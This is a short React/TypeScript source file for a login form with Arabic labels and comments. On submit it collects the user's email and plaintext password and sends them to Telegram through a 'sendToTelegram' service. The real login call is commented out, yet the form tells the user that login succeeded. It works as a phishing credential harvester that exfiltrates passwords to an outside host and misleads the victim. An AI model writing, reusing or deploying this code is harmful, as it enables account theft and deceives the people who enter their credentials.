// components/LoginForm.tsx
import React, { useState } from 'react';
import { sendToTelegram } from '../services/telegramService';

const LoginForm: React.FC = () => {
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const loginData = {
      email,
      password,
      timestamp: new Date().toLocaleString('ar-EG')
    };

    try {
      // أرسل البيانات لـ Telegram
      await sendToTelegram(loginData);
      
      // كمل عملية اللوجين العادية
      // await yourLoginFunction(email, password);
      
      alert('تم تسجيل الدخول بنجاح!');
    } catch (error) {
      console.error('Login failed:', error);
      alert('حدث خطأ في تسجيل الدخول');
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
        placeholder="البريد الإلكتروني"
        required
      />
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
        placeholder="كلمة المرور"
        required
      />
      <button type="submit">تسجيل الدخول</button>
    </form>
  );
};

export default LoginForm;
